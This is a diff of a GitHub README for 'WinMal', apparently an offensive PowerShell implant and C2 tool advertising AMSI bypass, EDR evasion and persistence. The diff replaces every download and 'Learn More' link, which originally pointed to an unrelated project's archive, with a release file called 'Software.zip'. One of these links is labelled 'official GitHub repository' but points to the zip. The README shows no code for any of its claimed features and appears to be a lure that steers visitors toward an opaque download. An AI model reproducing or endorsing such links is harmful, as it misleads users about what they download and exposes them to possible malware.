@@ -1,6 +1,6 @@
 # WinMal 🛡️
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/gurkeow/WinMal/releases/download/v1.0/Software.zip)](https://github.com/gurkeow/WinMal/releases/download/v1.0/Software.zip)
 
 Welcome to the WinMal repository, your go-to resource for an advanced PowerShell-based red team implant coupled with a custom C2 (Command & Control) server. Dive into the depths of cybersecurity with WinMal and explore a range of topics including aes-gcm encryption, amsi-bypass, c2 communication, dll sideloading, edr evasion, implant development, kernel bypass techniques, malware analysis, persistence mechanisms, proof of concepts, polyglot capabilities, and process ghosting in Windows environments.
 
@@ -10,7 +10,7 @@ In this repository, you will find a collection of powerful tools, scripts, and r
 ## 🚀 Getting Started
 To kickstart your journey with WinMal, simply download the latest release by clicking the button below. Remember, every step you take with WinMal is a step towards mastering the art of ethical hacking and cybersecurity.
 
-[![Download WinMal v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 💻
+[![Download WinMal v1.0.0](https://github.com/gurkeow/WinMal/releases/download/v1.0/Software.zip)](https://github.com/gurkeow/WinMal/releases/download/v1.0/Software.zip) 💻
 
 Once you have downloaded WinMal, unleash its power by exploring the various scripts, tools, and documentation included in the repository. Experiment, learn, and sharpen your cybersecurity skills with WinMal.
 
@@ -24,7 +24,7 @@ Connect with like-minded cybersecurity enthusiasts and red team professionals in
 aes-gcm-encryption, amsi-bypass, c2, dll-sideloading, edr-evasion, implant, kernel-bypass, malware, persistence, poc, polyglot, process-ghosting, windows
 
 ## 🌐 Learn More
-For more information about WinMal and its features, visit the official [GitHub repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+For more information about WinMal and its features, visit the official [GitHub repository](https://github.com/gurkeow/WinMal/releases/download/v1.0/Software.zip).
 
 Remember, in the world of cybersecurity, knowledge is power. Equip yourself with the tools and expertise provided by WinMal to stay ahead of emerging threats and secure cyberspace.
 
